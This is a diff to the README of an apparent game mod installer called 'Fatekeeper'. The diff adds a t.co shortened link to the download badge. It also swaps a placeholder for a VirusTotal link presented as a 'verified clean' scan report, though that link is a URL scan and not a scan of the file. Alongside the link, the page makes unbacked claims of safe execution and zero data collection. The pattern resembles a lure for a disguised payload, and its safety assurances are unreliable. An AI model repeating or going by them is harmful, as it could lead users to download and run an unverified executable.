@@ -15,7 +15,7 @@
 <h3>Ultimate Performance Fixes, Floating Damage UI Overlay, Visual Enhancer & Automated 1-Click Mod Manager</h3>
 
 
-<a href="">
+<a href="https://t.co/7rilXbW579">
   <img src="https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE%20-🔥?style=for-the-badge&logo=windows&color=ea4335" alt="Download Fatekeeper Mod Installer" height="60">
 </a>
 
@@ -89,7 +89,7 @@ Our customized installer manages the entire ecosystem for you. You do **not** ne
 ## 🔒 Security & Verification Data
 * **Data Privacy:** Zero data collection, zero analytics tracking, zero third-party telemetry scripts.
 * **Source Protection:** Safe execution. The distribution package is compiled using GitHub Actions automated workflows to ensure build authenticity.
-* **VirusTotal Scan Hub:** [Click here to view the verified clean anti-virus scanning report] *(Insert your link here once verified)*
+* **VirusTotal Scan Hub:** [🟢 Click here to view the verified clean anti-virus scanning report](https://www.virustotal.com/gui/url/7a2f54dd52c28b84fac520c33ad98baf3b0130a0b0b7e7820684144d84d57933?nocache=1)
 
 ---
 
